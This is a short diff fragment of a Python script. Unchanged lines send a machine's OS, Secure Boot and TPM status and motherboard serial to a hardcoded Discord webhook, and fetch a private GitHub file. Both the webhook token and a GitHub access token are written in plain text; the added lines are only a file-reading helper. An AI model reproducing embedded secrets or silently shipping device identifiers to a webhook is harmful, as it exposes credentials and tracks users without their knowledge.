@@ -35,7 +35,13 @@ os.system('cls')
 data_send_aes('https://discord.com/api/webhooks/1351046811875545149/8QEKRNoFYMq14tAMyVkbT7-sEvm_gUYw-tUYPOgyyA48MNNPZ0AzWcYNTc8ANHLUng4D',server_nickname ,my_os_data ,my_os_version ,my_secureboot ,my_tpm ,my_motherboard_serial ,aes_user_date_installed,myinfo_xx_lc)
 os.system('cls')
 
-
+def get_data_from_file(file_path):
+    if os.path.exists(file_path):
+        with open(file_path, 'r') as file:
+            content = file.read()
+        return content
+    else:
+        return "Error"
 def premx_2025(mycontent: str):
     raw_url = "https://raw.githubusercontent.com/nvtsxlz/myown/9979000b72229cb3a7a4b15da7aa886f7017174d/premx_myself.txt?token=GHSAT0AAAAAADBMT63O3KJMDXRXP7UZBZVY2BBO3FQ"
     headers = {"Authorization": f"token {mycontent}"}
